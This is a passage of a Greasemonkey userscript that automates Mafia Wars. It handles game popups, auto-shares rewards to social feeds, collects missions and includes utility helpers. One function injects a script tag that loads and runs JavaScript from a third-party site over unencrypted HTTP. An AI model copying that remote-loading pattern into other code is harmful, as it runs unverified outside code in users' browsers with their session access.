            if (popupInnerNoTags.indexOf('Failed to give reward') != -1) {
              DEBUG('Popup Process: MISSIONS - Claim Rewards Failed');
              return(closePopup(currentPopup, "Claim Mission Rewards Failed"));
            }

            // Log Mission Rewards
            if (popupInnerNoTags.indexOf('completed the operation') != -1) {
              DEBUG('Popup Process: MISSIONS - Claim Rewards : '+currentPopup.id);
              var rewards = $x('.//td[@class="collectPopLootItem"]', currentPopup);
              var rewardsTxt ="";
              var rewardsNoTags ="";
              for(i=0;i<rewards.length;++i){
                rewardsNoTags = rewards[i].innerHTML.untag();
                if (rewardsNoTags.match(/(.+?)(\d{2})(\d{2})$/)) rewardsNoTags = '<span class="loot">'+RegExp.$1+ '</span> (A: '+RegExp.$2+' / D: '+ RegExp.$3+')';
                else if (rewardsNoTags.match(/(.+?)(\d{2})(\d{1})$/)) rewardsNoTags = '<span class="loot">'+RegExp.$1+ '</span> (A: '+RegExp.$2+' / D: '+ RegExp.$3+')';
                else if (rewardsNoTags.match(/(.+?)(\d{1})(\d{2})$/)) rewardsNoTags = '<span class="loot">'+RegExp.$1+ '</span>(A: '+RegExp.$2+' / D: '+ RegExp.$3+')';
                else if (rewardsNoTags.match(/(.+?)(\d{1})(\d{1})$/)) rewardsNoTags = '<span class="loot">'+RegExp.$1+ '</span>(A: '+RegExp.$2+' / D: '+ RegExp.$3+')';
                if(rewardsTxt) rewardsTxt += ', '+ rewardsNoTags;
                else rewardsTxt = rewardsNoTags;
              }
              addToLog('lootbag Icon', 'Mission Rewards : '+rewardsTxt);
              if (!isGMChecked('autoShareRewards')) return(closePopup(currentPopup, "Mission Rewards claimed"));
            }

            // Share Rewards
            var shareButton = xpathFirst('.//a[@class="sexy_button_new medium white sexy_call_new" and contains(@onclick,"postCelebrateFeed")]',currentPopup);
            if(shareButton) {
              if (isGMChecked('autoShareRewards')) {
                clickElement(shareButton);
                DEBUG('Popup Process: MISSIONS - Share Rewards');
              }
              return(closePopup(currentPopup, "Share Rewards"));
            }

// War Popups
            // Get rid of War Succesfull War Attack popup
            if (popupInnerNoTags.indexOf('won the fight') != -1) {
              return(closePopup(currentPopup, "Succesfull War Attack"));
            }

            // Get rid of War is already helped popup
            if (popupInnerNoTags.indexOf('have already helped') != -1) {
              return(closePopup(currentPopup, "Already Helped"));
            }

            // Get rid of War is already over popup
            if (popupInnerNoTags.indexOf('war is already over') != -1) {
              return(closePopup(currentPopup, "War already over"));
            }

            // Get rid of War Not in Mafia popup
            if (popupInnerNoTags.indexOf('a mafia request') != -1) {
              return(closePopup(currentPopup, "War Not in Mafia"));
            }

            // War Declaration
            var warDeclareButton = xpathFirst('.//a[@class="sexy_button_new short white sexy_call_new" and contains(@onclick,"attemptFeed")]',currentPopup);
            if(warDeclareButton) {
              if (isGMChecked('autoWarPublish')) {
                clickElement(warDeclareButton);
                DEBUG('Popup Process: WAR - Declare War Publishing');
              }
              return(closePopup(currentPopup, "War Declaration Popup"));
            }

            // War Rally for Help
            if (popupInnerNoTags.indexOf('help to take out all 7') != -1) {
              eltHelp = xpathFirst('.//a[contains(.,"Ask Friends for Help")]', currentPopup);
              if(eltHelp && isGMChecked('autoWarResponsePublish')) {
                clickElement(eltHelp);
                DEBUG('Popup Process: WAR - Ask Friends for Help Publishing');
              }
              return(closePopup(currentPopup, "War Help Popup"));
            }

            // War Reward : Share Victory Coins
            if (popupInnerNoTags.indexOf('Share Victory Coins') != -1) {
              var warRewardButtons = $x('.//a[@class="sexy_button_new short white" and contains(@onclick,"postWarWin")]',currentPopup);
              if(warRewardButtons && isGMChecked('autoWarRewardPublish')) {
                for(i=0;i<warRewardButtons.length>0;++i){
                  warRewardButton = warRewardButtons[i];
                  clickElement(warRewardButton);
                  DEBUG('Popup Process: WAR - Reward Friends (Share Coins) for Help Publishing');
                }
              }
              return(closePopup(currentPopup, "War Reward (Share Coins) Popup"));
            }

            // Tournament Backup
            eltHelp = xpathFirst('.//a[contains(.,"Fight Anyway")]', currentPopup);
            if(eltHelp){
              clickElement(eltHelp);
              DEBUG('Popup Process: Tournament - Fight Anyway');
              return(closePopup(currentPopup, "Tournament - Fight Anyway"));
            }

            // Themed Events
            eltHelp = xpathFirst('.//a[contains(.,"Share")]', currentPopup);
            if(eltHelp){
              clickElement(eltHelp);
              DEBUG('Popup Process: Shared Themed Event Items');
              return(closePopup(currentPopup, "Shared Themed Event Items"));
            }

            // Loot Events
            if(popupInnerNoTags.match(/You found (.*) loot event./i) || popupInnerNoTags.match(/You found all (.*) in action./)) {
              if (popupInnerNoTags.match(/You found (.*) loot event./i)) {
                logtxt = 'You found ' + RegExp.$1 + ' loot event.';
              } else if (popupInnerNoTags.match(/You found all (.*) in action./)) {
                logtxt = 'You found ' + RegExp.$1 + ' in action.';
              }
              if(logtxt) addToLog('yeah Icon',logtxt);
              return(closePopup(currentPopup, "Loot Event"));
            }

            // Try to Process Unknown Popups
            if(isGMChecked('autoProcessPopups')) {
              eltButton = xpathFirst('.//a[@class= "sexy_button_new medium white"]', currentPopup);
              if(!eltButton) eltButton = xpathFirst('.//a[@class= "sexy_button_new short white"]', currentPopup);
              if(eltButton) {
                clickElement(eltButton);
              }
              DEBUG('Unknow Popup Processed');
              DEBUG(currentPopup.innerHTML.untag());
              return(closePopup(currentPopup, "Closing Unknown Popup"));
            }

          // End of Popups Section

          }
        /* END */
        }
      }
    }
  } catch (ex) {
    DEBUG('Error @handlePopups: ' + ex);
  }
  return false;
}

function updateScript() {
  try {
    GM_xmlhttpRequest({
      method: 'GET',
      url: SCRIPT.metadata + '?' + Math.random(),
      onload: function(resp) {
        if (resp.status != 200) return;

        if (!resp.responseText.match(/@version\s+(\d+).(\d+).(\d+)/)) return;
        var googleVersion = RegExp.$1+'.'+RegExp.$2+'.'+RegExp.$3;
        var runningVersion = SCRIPT.version;
        if (googleVersion != runningVersion) {
          if (window.confirm('Version ' + googleVersion + ' is available!\n\n' + 'Do you want to install this version?' + '\n')) {
            window.location.href = SCRIPT.url;
          }
        } else {
          alert('You already have the latest version: '+ googleVersion);
          return;
        }
      }
    });
  } catch (ex) {
    addToLog('warning Icon', 'BUG DETECTED (updateScript): ' + ex);
  }
}

///////////////////////////////////////////////////////////////////////////////
//                           UTILITY METHODS                                 //
///////////////////////////////////////////////////////////////////////////////

/******************************** General ********************************/

function clearSettings() {
  if (typeof GM_listValues == 'function' &&
      typeof GM_deleteValue == 'function') {
    var values = GM_listValues();
    for (var i in values) {
      if (typeof GM_deleteValue == 'function')
        GM_deleteValue(values[i]);
    }
  } else {
    alert('In order to do this you need at least GreaseMonkey version: 0.8.20090123.1. Please upgrade and try again.');
  }
}

/******************************** Array ********************************/

function getArrayDiffs(workingArray) {
  diffArray = [];
  for (var i = 1; i < workingArray.length; i++) {
    if (workingArray[i] - workingArray[i-1] < 0) {
      diffArray.push(0)
    } else {
      diffArray.push(workingArray[i] - workingArray[i-1]);
    }
  }
  diffArray.unshift(0);
  return diffArray;
}

// Save an array of strings. The strings must not contain "\n".
function setSavedList(listName, list) {
  GM_setValue(listName, list.join('\n'));
}

// Get an array of strings that was saved with setSavedList().
function getSavedList(listName) {
  var savedList = GM_getValue(listName, '');
  return savedList? savedList.split('\n') : [];
}

// Add an item to a list saved with setSavedList().
// If the size of the list is greater than the "max"
// parameter, the first item in the list is removed.
function addSavedListItem(listName, item, max) {
  var savedList = getSavedList(listName);

  // Only add if it isn't already there.
  if (savedList.indexOf(item) != -1) {
    return;
  }

  savedList.push(item);
  if (max > 0) {
    while (max < savedList.length) {
      var itm = savedList.shift();
      DEBUG('Removing ' + itm + ' from ' + listName + '.');
    }
  }
  setSavedList(listName, savedList);
}

// Remove an item from a list saved with setSavedList().
function removeSavedListItem(listName, item) {
  var savedList = getSavedList(listName);
  var idx = savedList.indexOf(item);
  if (idx != -1) {
    savedList.splice(idx, 1);
    setSavedList(listName, savedList);
    return true;
  }
  // No matches.
  return false;
}

function removeJobForItem(jobList, itemName){
  var jobs = getSavedList(jobList, '');
  var i=0;
  if (jobs.length>0){
    var job=jobs[jobs.length-1];
    requirementJob.forEach(
     function(j){
       if (j[1] == job) {
         if (requirementJob[i][0]==itemName) {
           removeSavedListItem(jobList,requirementJob[i][1]);
           DEBUG('removing job'+requirementJob[i][1]);
         }
       }
       i++;
     }
    );
  }
}

function cycleSavedList(listName) {
  // Move the first item to the end of the list.
  var opponents = GM_getValue(listName, '').split('\n');
  var first = opponents.shift();
  if (first) {
    opponents.push(first);
  }
  GM_setValue(listName, opponents.join('\n'));
}

/******************************** HTML/DOM ********************************/

// Load URL and return the untagged response text (synchronous)
function loadUrlWait (url) {
  try {
    var xmlHTTP = new XMLHttpRequest();
    DEBUG('Loading URL (synch): ' + url);
    xmlHTTP.open('GET', url, false);
    xmlHTTP.send(null);
    return xmlHTTP.responseText.untag();
  } catch (ex) {
    DEBUG ('@loadUrl (synch): ' + ex);
    return false;
  }
}

// Load URL and hook the status_change to the function (asynchronous)
function loadUrl (url, funcStateChange) {
  try {
    var xmlHTTP = new XMLHttpRequest();
    DEBUG('Loading URL (asynch): ' + url);
    xmlHTTP.onreadystatechange = funcStateChange;
    xmlHTTP.open('GET', url, true);
    xmlHTTP.send(null);
  } catch (ex) {
    // Ignore exceptions for this
    DEBUG ('@loadUrl (asynch): ' + ex);
  }
}



// Load Chuck-A-Crap script by Arun
function eventclick_chuckaCrap() {
  var src = 'http://codeoutpost.com/Scripts/ChuckACrapQueue.js?' + Math.random();
  remakeElement('script', document.getElementsByTagName('head')[0],{'id':'externalScripts','src':src} );
}

function getMWUrl (server, params) {
  var mwURL = document.location.href;
  mwURL = mwURL.replace(/html_server/, server);
  mwURL = mwURL.replace('#','');

  // Create or Replace params
  for (var i in params) {
    if (new RegExp(i + '=\\w*').test(mwURL))
      mwURL = mwURL.replace(new RegExp(i + '=\\w*'), i + '=' + params[i]);
    else
      mwURL += '&' + i + '=' + params[i];
  }

  return mwURL;
}

function getHitUrl (targetId) {
  return getMWUrl ('html_server', {'xw_controller':'hitlist', 'xw_action':'set', 'target_id':targetId});
}

function getProfileUrl (userId) {
  return getMWUrl ('html_server', {'xw_controller':'stats', 'xw_action':'view', 'user':userId});
}

function stripURI(img) {
  img = img.split('"')[1];
  return img.replace('" />', '');
}

function showIfUnchecked(setting) {
  if (setting != 'checked') {
    setting = 'unchecked';
  }
  return setting;
}

function showIfSelected(setting) {
  if (setting == 'checked') {
    return 'selected';
  } else {
    return 'not selected';
  }
}

function showIfRelative(key) {
  return GM_getValue(key) == 'checked'? 'relative' : 'absolute';
}

// Converts a link element to an HTML string with an optional CSS class.
function linkToString(link, className) {
  if (!link) return link;

  // Decode ID
  var decBase64ID = function (strInput) {
    if (strInput.match(/user=/)) {
      var id = strInput.split('user=')[1].split('\'')[0].split('&')[0];
      strInput = strInput.replace (id, decodeID(id));
    }
    return strInput;
  };

  var str = '<a';
  if (className)
    str += ' class="' + className + '"';
  var onclick = link.getAttribute('onclick');
  if (onclick)
    str += ' onclick="' + decBase64ID(onclick) + '"';

  str += ' href="' + decBase64ID(link.href) + '">' + link.innerHTML + '</a>';

  return str;
}

function decodeHTMLEntities(str) {
  if (!str) return str;

  scratchpad.innerHTML = str;
  return scratchpad.value;
}

// Hide the element
function hideElement(elt, hideFlag) {
  if (!elt) return;
  if (hideFlag == null) hideFlag = true;
  elt.setAttribute("id", hideFlag ? "mwapHide" : "", 0);
  return elt;
}


function clickElement(elt) {
  if (!elt) {
    addToLog('warning Icon', 'BUG DETECTED: Null element passed to clickElement().');
    return;
  }

  // Simulate a mouse click on the element.
  var evt = document.createEvent('MouseEvents');
  evt.initMouseEvent("click", true, true, window,
                     0, 0, 0, 0, 0, false, false, false, false, 0, null);
  elt.dispatchEvent(evt);
}

function ignoreElement(element) {
  var parentElt = element.parentNode;
  var id;
  if (parentElt) {
    id = parentElt.id;
    if (id && (id.indexOf('countdown') != -1 || id.indexOf('timer') != -1 || id.indexOf('ask_for_job_help_time') != -1
        || id.indexOf('tournament_time_left') != -1 || id.indexOf('tournament_try_again_timer') != -1 || id.indexOf('zmc_event_count') != -1
        ))
      return true;
  }

  id = element.id;
  if (id && (id.indexOf('countdown') != -1 || id.indexOf('timer') != -1 || id.indexOf('ask_for_job_help_time') != -1
        || id.indexOf('tournament_time_left') != -1 || id.indexOf('tournament_try_again_timer') != -1 || id.indexOf('zmc_event_count') != -1
        ))
    return true;

  return false;
}

function logElement(element, heading) {
  if (!element) return;

  // Write information about the element to the javascript console.
  var elt = element;
  GM_log((heading? heading + ' ' : '') +
         'tag=' + elt.tagName +
         ', id=' + elt.id +
         ', class=' + elt.className +
         ', value=' + elt.nodeValue
  );
  elt = element.parentNode;
  if (elt) {
    GM_log((heading? heading + ' ' : '') +
           'parent tag=' + elt.tagName +
           ', id=' + elt.id +
           ', class=' + elt.className +
           ', value=' + elt.nodeValue
    );
  }
}

function xpathFirst(p, c) {
  return document.evaluate(p, c || document, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
}

function $x(p, c) {
  var i, r = [], x = document.evaluate(p, c || document, null, XPathResult.UNORDERED_NODE_ITERATOR_TYPE, null);
  while ((i = x.iterateNext())) r.push(i);
  return r;
}

function xpath(query, element) {
  var elt = (element == null) ? document : element;
  return document.evaluate(query, elt, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
}

// Toggle checkbox element and return true if it is checked
function toggleCheckElt(eltId) {
  if (isGMChecked(eltId)) {
    GM_setValue(eltId, 0);
    return false;
  } else {
    GM_setValue(eltId, 'checked');
    return true;
  }
}

// Save an array of checkbox elements
function saveCheckBoxElementArray(arrayEltIds) {
  for (var i=0; i<arrayEltIds.length; i++)
    saveCheckBoxElement(arrayEltIds[i])
}

// Save checkbox element and return true if it is checked
function saveCheckBoxElement(eltId) {
  if (document.getElementById(eltId).checked === true) {
    GM_setValue(eltId, 'checked');
    return true;
  } else {
    GM_setValue(eltId, 0);
    return false;
  }
}

// Check if a GM value is the same as the passed value
function isGMEqual (gmName, gmValue) {
  return GM_getValue(gmName) + '' == gmValue + '';
}

// Check if a GM value is checked
function isGMChecked (gmName) {
  return isGMEqual (gmName, 'checked');
}

// Check if a GM value is undefined
function isGMUndefined (gmName) {
  return isUndefined (GM_getValue(gmName));
}

// Check if a value is undefined
function isUndefined(value) {
  return value + '' == 'undefined';
}

function makeElement(type, appendto, attributes, checked, chkdefault) {
  var element = document.createElement(type);
  if (attributes != null) {
    for (var i in attributes) {
      element.setAttribute(i, attributes[i]);
    }
  }
  if (checked != null) {
    if (GM_getValue(checked, chkdefault) == 'checked') {
      element.setAttribute('checked', 'checked');
    }
  }
  if (appendto) {
    appendto.appendChild(element);
  }
  return element;
}

function destroyByID( id){
  var elt = document.getElementById(id);
  if (elt) elt.parentNode.removeChild(elt);
}

function remakeElement(type, appendto, attributes, checked, chkdefault) {
  if (attributes.id) destroyByID(attributes.id);
  return makeElement(type, appendto, attributes, checked, chkdefault);
}

/******************************** CASH PARSING ********************************/

// Parse a monetary value such as "C$50,000" and return an integer.
function parseCash(cash) {
  var c = cash;
  if (typeof(c) == 'string') {
    c = c.trim().replace(/[A-Z$,'']/g, '');
  }
  return parseInt(c);
}
// Parses a monetary value such as "C$50,000" and returns the city (const NY/CUBA/MOSCOW/BANGKOK/LV).
function parseCashLoc(cash) {
  if (typeof(cash) == 'string') {
    if (cash.match(/([A-Z])\$[\d,]*\d/)) {
      switch (RegExp.$1) {
        case 'C': return CUBA;
        case 'M': return MOSCOW;
        case 'B': return BANGKOK;
        case 'V': return LV;
        case 'L': return ITALY;
      }
    }
  }
  return NY;
}

function makeCommaValue(nStr) {
  nStr = String(nStr);
  var rgx = /^(.*\s)?(\d+)(\d{3}\b)/;
  return nStr == (nStr = nStr.replace(rgx, "$1$2,$3")) ? nStr : makeCommaValue(nStr);
}

/******************************** DATE/TIME ********************************/
//newchange_need_to_add_to_main
// reads a date string from a stored GM value and converts it to seconds since 1970
function getGMTime(GMvalue) {
  var tempVal = GM_getValue(GMvalue, 0);
  var d = Date.parse(tempVal);
//    Diagnose(' mission time' + d);
  if(!d) {
    //Diagnose(' timer not returning correct time before save: ' + d);
    setGMTime(GMvalue,"00:00:30"); // problem with timer, set to 30 seconds
    var tempVal = GM_getValue(GMvalue, 0);
    var d = Date.parse(tempVal);
    //Diagnose(' timer fixed after save: ' + d);
  }
  return d/1000;
}


// takes a string input in the form of a countdown 'MM:SS', 'HH:MM:SS', 'MM minutes and SS seconds' and stores the
// time when the countdown is zero in a GM value.  Also takes an input of 'now' and stores the current time.
function setGMTime(GMvalue, countdownStr) {
  var d = new Date();
  d.setMilliseconds(0);

  if (countdownStr != 'now')
    d.setTime(d.getTime()+(timeLeft(countdownStr)*1000));

  GM_setValue(GMvalue, d.toString());
}

// returns the number of seconds left until a date stored in a GM value
function timeLeftGM(GMvalue) {
  var timeToCompare = getGMTime(GMvalue);

  var d = new Date();
  d.setMilliseconds(0);

  return Math.max(timeToCompare-(d.getTime()/1000), 0);
}

// takes a string input in the form of 'MM:SS', 'HH:MM:SS', or 'MM minutes and SS seconds' and returns the number of seconds it represents
function timeLeft(timeToConvert) {
  if (!timeToConvert)
    return 0;

  var returnVal = 0;

  var temp = new Array();
  temp = timeToConvert.split(':');

  if (temp.length == 2)  // MM:SS
    returnVal = ((parseInt(temp[0]) * 60) + parseInt(temp[1]));
  else if (temp.length == 3) // HH:MM:SS
    returnVal = ((parseInt(temp[0]) * 60 * 60) + (parseInt(temp[1]) * 60) + parseInt(temp[2]));
  else if (temp.length == 1) {  // 'HH hours and MM minutes and SS seconds'
    temp = timeToConvert.split(' and ');
    for (i = 0; i < temp.length; i++) {
      spaceIndex = temp[i].indexOf(' ');
      if (spaceIndex != -1) {
        firstPart = temp[i].substring(0, spaceIndex);
        secondPart = temp[i].substring(spaceIndex+1, temp[i].length);
        if ((secondPart == 'minutes') || (secondPart == 'minute'))
          returnVal = returnVal + (parseInt(firstPart) * 60);
        else if ((secondPart == 'seconds') || (secondPart == 'second'))
          returnVal = returnVal + (parseInt(firstPart));
        else if ((secondPart == 'hours') || (secondPart == 'hour'))
          returnVal = returnVal + (parseInt(firstPart * 60 * 60));
        else if ((secondPart == 'days') || (secondPart == 'day'))
          returnVal = returnVal + (parseInt(firstPart * 24 * 60 * 60));
      }
    }
  }
  return(returnVal);
}

// Convert decimal time to ?h ?m ?s format
function getDecimalTime(decimalTime) {
  var num = parseFloat(decimalTime);
  var strTime = '';
  if (num) {
    if (num >= 60) {
      strTime = parseInt(num/60) + 'h ';
      num -= parseInt(num); num *= 60;
    }
    strTime += parseInt(num) + 'm ';
    num -= parseInt(num); num *= 60;
    strTime += parseInt(num) + 's';
  }
  return strTime.replace('00','0');
}

function secondsToHMS(d) {
	d = Number(d);
	var h = Math.floor(d / 3600);
	var m = Math.floor(d % 3600 / 60);
	var s = Math.floor(d % 3600 % 60);
	return ((h > 0 ? h + ":" : "") + (m > 0 ? (h > 0 && m < 10 ? "0" : "") + m + ":" : "0:") + (s < 10 ? "0" : "") + s);
}

// Convert seconds to ?h ?m ?s format
function getHoursTime(timer) {
  var seconds = timeLeftGM(timer);
  if (seconds == 0)
    return 0;
  if (isNaN(seconds))
    return undefined;
  var num = parseInt(seconds);
  var strTime = '';
  if (num) {
    num /= 60;
    if (num >= 60) {
      num /= 60;
      strTime = parseInt(num) + 'h ';
      num -= parseInt(num); num *= 60;
    }
    strTime += parseInt(num) + 'm ';
    num -= parseInt(num); num *= 60;
    strTime += parseInt(num) + 's';
  }
  return strTime;
}

/******************************** Base64 Logic ********************************/

function decodeID (strID) {
  // Unescape and clean up the ID first (for %3D string, non-base 64 strings etc)
  strID = unescape (strID);
  if (isNaN(strID)) {
    strID = decode64(strID);
  }
  return strID;
}

// Function to decode strings from Base64
function decode64(input) {
  var output = "";
  var chr1, chr2, chr3 = "";
  var enc1, enc2, enc3, enc4 = "";
  var i = 0;

  // remove all characters that are not A-Z, a-z, 0-9, +, /, or =
  var base64test = /[^A-Za-z0-9\+\/\=]/g;
  if (base64test.exec(input)) {
    DEBUG('Invalid character(s) found in input (' + input +'). Expect errors in decoding.');
  }
  input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

  do {
     enc1 = keyStr.indexOf(input.charAt(i++));
     enc2 = keyStr.indexOf(input.charAt(i++));
     enc3 = keyStr.indexOf(input.charAt(i++));
     enc4 = keyStr.indexOf(input.charAt(i++));

     chr1 = (enc1 << 2) | (enc2 >> 4);
     chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
     chr3 = ((enc3 & 3) << 6) | enc4;

     output = output + String.fromCharCode(chr1);

     if (enc3 != 64) {
        output = output + String.fromCharCode(chr2);
     }
     if (enc4 != 64) {
        output = output + String.fromCharCode(chr3);
     }

     chr1 = chr2 = chr3 = "";
     enc1 = enc2 = enc3 = enc4 = "";

  } while (i < input.length);

  return output;
}

function encode64(input) {
  var output = "";
  var chr1, chr2, chr3 = "";
  var enc1, enc2, enc3, enc4 = "";
  var i = 0;

  do {
     chr1 = input.charCodeAt(i++);
     chr2 = input.charCodeAt(i++);
     chr3 = input.charCodeAt(i++);

     enc1 = chr1 >> 2;
     enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
     enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
     enc4 = chr3 & 63;

     if (isNaN(chr2)) {
        enc3 = enc4 = 64;
     } else if (isNaN(chr3)) {
        enc4 = 64;
     }

     output = output +
        keyStr.charAt(enc1) +
        keyStr.charAt(enc2) +
        keyStr.charAt(enc3) +
        keyStr.charAt(enc4);
     chr1 = chr2 = chr3 = "";
     enc1 = enc2 = enc3 = enc4 = "";
  } while (i < input.length);

  return output;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////
function Auto_Mafia_Mission(){
try{
  missionsDelays = getAutoPlayDelay();
  //missionsDelays = 5000 ; // 6k = 6 seconds use this to override delay values
  // Go to the missions tab
var Miss_ID = null;
var Miss_Slot = null;
var MyMafiaJobs = null;

  if (!OnMissionsTab()) {
    Autoplay.fx = GoMissionsTab;
    Autoplay.delay = getAutoPlayDelay();     //    to pass stuff around
    Autoplay.start();
    return true;
  }
  Diagnose('Mymission Timer '+parseInt(timeLeftGM('checkedmymissionTimer'))+' Seconds.') ;
  if(!timeLeftGM('checkedmymissionTimer')){
    if (!My_Missions_Tab()) {
      Autoplay.fx = Go_My_Missions_Tab;
      Autoplay.delay = missionsDelays;
      Autoplay.start();
      return true;
    }
    //Diagnose(' mission. Checking myMissions.');
    if(isGMChecked('AskMissionHelp') ) Chk_mission_help () ;
    if(isGMChecked('AutoMafiaCollection')) Auto_Mafia_Collection() ;  // will collect mymission
    if(isGMChecked('AutoMafiaRemoved'))    Auto_Mafia_Remove() ;  // will check for being removed from missions onthis page
    //Diagnose(' mission. end of myMissions first page');
    if (Chk_Nxt_MY_Mission()) {
      Autoplay.fx = Go_Nxt_Page;
      Autoplay.delay = getAutoPlayDelay();
      Autoplay.start();
      return true;
    }
    Diagnose(' mission. end of myMissions processing, set tiemr 2 min, checking myMafia missions.');
    setGMTime('checkedmymissionTimer', '00:02:00');
  } // end of mymissions next is myMafia missions
  //
  if (!Mafia_Missions_Tab()) {
    Autoplay.fx = Go_Mafia_Missions_Tab();
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }
  if(isGMChecked('AskMissionHelp') ) Chk_mission_help () ;
  if(isGMChecked('AutoMafiaCollection')) Auto_Mafia_Collection() ;  // will collect mymission
  if(isGMChecked('AutoMafiaRemoved'))    Auto_Mafia_Remove() ;  // will check for being removed from missions onthis page

  if(isGMChecked('AutoMafiaJob')) {
    if(Check_Mission_Job() ) {
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.fx = Do_Mission_Job() ;
    Autoplay.start();
    return true;
    }
  }

  if (Chk_Nxt_Page()) {
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.fx = Go_Nxt_Page;
    Autoplay.start();
    return true;
  }
//newchange
  } catch(err) {
//	alert(' missions error \n\n' + err)
    addToLog('warning Icon', ' missions error '+err);
   }
  return;
}
////
function OnMissionsTab() {
  if(xpathFirst('//div[@id="socialMissionNav"]//a',innerPageElt)) {
    return true;
  }
  return false;
}
////
function GoMissionsTab() {

  var elt = xpathFirst('//div[@id="nav_link_events_unlock"]//a',menubarElt);
  if (elt) {
    var numMiss = xpathFirst('//span[contains(@id,"user_socialmissions")]',menubarElt);
    if (numMiss) {
      missCnt = (numMiss.innerHTML.untag() );
      numMissCnt = parseInt(missCnt.replace( /\D/g , "" ));
      if(numMissCnt > 0) {
        Diagnose('Clicking missions tab to go check on '+numMissCnt +' missions.');
        clickElement(elt);

        return true;
      } else {
        mmis_time = '00:10:00'; // set timer to 10 min
        Diagnose(' missions count '+numMissCnt+' timer set to: ' + mmis_time );
        setGMTime('colmissionTimer', mmis_time);
        return false;
      }
    }  else {
      Diagnose('number of missions not found, go check just in case');
      clickElement(elt);
    }
  }
}
////
function Chk_mission_help (){
  var ask_mission_help = xpathFirst('.//a[@class="sexy_button_new medium white sexy_call_new ask_for_help" and contains(@onclick, "postAskHelpFeed")]', innerPageElt);
  if(ask_mission_help  ) {
    clickElement(ask_mission_help);
  } else  {
    return false;
  }
return true;
}
////
function Mafia_Missions_Tab() {
  // if we find this string we are on the mymafiamissions page not on page for me only
  var myMafiaMissions = xpathFirst('.//a[(@id="myMafiaMissions"  and contains(@onclick, "controller=socialmission")  and contains(@style, "marketplace_menu_item_hover"))]', innerPageElt);
  if(myMafiaMissions) {
    return true ;
  }
  return false;
}
////
function My_Missions_Tab() {
    //Diagnose(' mission. checking myMissions tab.');
  // if we find this string we are on the mymafiamissions page not on page for me only
  var MyMissions = xpathFirst('.//a[(@id="myMissions"  and contains(@onclick, "controller=socialmission")  and contains(@style, "marketplace_menu_item_hover"))]', innerPageElt);
  if(MyMissions) {
    return true ;
  }
  return false;
}
////
function Go_My_Missions_Tab() {
   //Diagnose(' mission. need to change to myMissions tab.');
  // checking mafia missions, if hover is NOT found we are NOT on it, we are on mymafia page instead , so if string found, we need to click to change
  var MyMissionstab = xpathFirst('.//a[@id="myMissions"  and contains(@onclick, "controller=socialmission")  and not (contains(@style, "graphics/marketplace_menu_item_hover"))]', innerPageElt);
  if(MyMissionstab) {
    clickElement(MyMissionstab);
    return true;
    }
    return false;
}
////
function Go_Mafia_Missions_Tab() {
  // checking mafia missions, if hover is NOT found we are NOT on it, we are on mymafia page instead , so if string found, we need to click to change
  var myMafiaMissionstab = xpathFirst('.//a[@id="myMafiaMissions"  and contains(@onclick, "controller=socialmission")  and not (contains(@style, "graphics/marketplace_menu_item_hover"))]', innerPageElt);
  if(myMafiaMissionstab) {
    //Diagnose(' mission. need to go to mymafiamissions tab.');
    clickElement(myMafiaMissionstab);
    return true;
    }
    //Diagnose(' mission. ON mymafiamissions tab.');
  return false;
}
////
function Auto_Mafia_Collection(){
  if (Chk_Mafia_Collection()) {
    Autoplay.fx = Do_Reward_Collection();
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }
}
////
function Chk_Mafia_Collection(){
  var missionButtons;
  var numButtons;
  missionButtons = $x('.//a[@class="sexy_button_new medium green" and contains(@onclick, "collectReward")]', innerPageElt);
  numButtons = missionButtons.length;
  if(numButtons>0){
//  DEBUG(' '+numButtons+' mission collection button(s) found.');
  return true;
  }
return false;
}
////
function Do_Reward_Collection(){
  var ColMissionReward = xpathFirst('.//a[@class="sexy_button_new medium green" and contains(@onclick, "collectReward")]', innerPageElt);
  if (ColMissionReward) {
    //  addToLog('info Icon', 'Collecting mission rewards.');
    //  clickAction = 'Mission_rewards';  // NOT used yet
    clickElement(ColMissionReward);
    //  Chk_Left_Page();  // if we removed something we gotta go back a page
    return true;
    }
  return;
}
////
function Auto_Mafia_Remove(){

  var parentDivs;
  parentDivs = $x('.//div[@class="missionBoxRight"]', innerPageElt);
  numDivs = parentDivs.length;

  if(numDivs>0){
    for(i=0;i<numDivs;i++){
      var ClrRemovedButton = xpathFirst('.//a[@class="sexy_button_new medium white" and contains(@onclick, "removeMission") and not (contains(@style,"none"))]', parentDivs[i]);
      if (ClrRemovedButton) {
        DEBUG(' mission closed. I was removed from, or expired.');
        clickElement(ClrRemovedButton);
        Chk_Left_Page();  // if we removed something we gotta go back a page
        return true;
      }

      var ClrCloseButton = xpathFirst('.//a[@class="sexy_button_new medium white" and contains(@onclick, "removeMission") and contains(.,"Close")]', parentDivs[i]);
      if (ClrCloseButton) {
        DEBUG(' mission closed. Mission Expired.');
        clickElement(ClrCloseButton);
        Chk_Left_Page();  // if we removed something we gotta go back a page
        return true;
      }
    }
  }
  return;
}
////
function chk_nrg(){
  //Diagnose(' mission checking energy availability.' );
  if (energy < Miss_Nrg_Req ) {
    Diagnose(' mission Skipped. energy: ' + energy + ', cost=' + Miss_Nrg_Req);
    return false;
  }
//  if (energy - Miss_Nrg_Req < SpendMissionEnergy.floor && !SpendMissionEnergy.canBurn) {
  if (energy - Miss_Nrg_Req < SpendMissionEnergy.floor ) {
    Diagnose(' mission Skipped energy =' + energy +
      ', floor=' + SpendMissionEnergy.floor +
      ', Miss_Nrg_Req=' + Miss_Nrg_Req +
      ', burn=' + SpendMissionEnergy.canBurn);
    return false;
  }
  return true;
}
////
function chk_stam() {
  //Diagnose(' mission  checking Stamina availability.' );
  if (stamina < Miss_Stam_Req ) {
    Diagnose(' mission Skipped. Stamina=' + stamina + ', cost=' + Miss_Stam_Req);
    return false;
  }
//  if ((stamina - Miss_Stam_Req) < SpendMissionStamina.floor && !SpendMissionStamina.canBurn) {
  if ((stamina - Miss_Stam_Req) < SpendMissionStamina.floor ) {
    Diagnose(' mission Skipped. Stamina=' + stamina +
